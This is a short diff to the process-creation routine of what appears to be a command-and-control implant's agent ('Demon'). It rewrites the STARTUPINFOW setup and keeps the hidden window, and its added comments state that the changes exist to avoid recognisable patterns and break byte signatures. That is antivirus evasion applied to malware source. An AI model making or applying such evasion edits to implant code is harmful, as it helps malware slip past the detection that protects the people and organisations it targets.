@@ -587,15 +587,24 @@ BOOL ProcessCreate(
 ) {
     PPACKAGE        Package            = NULL;
     PANONPIPE       AnonPipe           = { 0 };
-    STARTUPINFOW    StartUpInfo        = { 0 };
+    STARTUPINFOW    StartUpInfo;
     BOOL            Return             = TRUE;
     PVOID           Wow64Value         = NULL;
     BOOL            DisabledWow64Redir = FALSE;
     BOOL            DisabledImp        = FALSE;
     HANDLE          PrimaryToken       = NULL;
 
-    StartUpInfo.cb          = sizeof( STARTUPINFOA );
-    StartUpInfo.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    // Initialize STARTUPINFOW to avoid recognizable patterns
+    MemSet( &StartUpInfo, 0, sizeof( STARTUPINFOW ) );
+    
+    // Set structure size using dynamic calculation
+    StartUpInfo.cb = sizeof( STARTUPINFOW );
+    
+    // Split flag assignments to break byte pattern
+    StartUpInfo.dwFlags = STARTF_USESTDHANDLES;
+    StartUpInfo.dwFlags |= STARTF_USESHOWWINDOW;
+    
+    // Set window show state
     StartUpInfo.wShowWindow = SW_HIDE;
 
     Package = PackageCreate( DEMON_INFO );
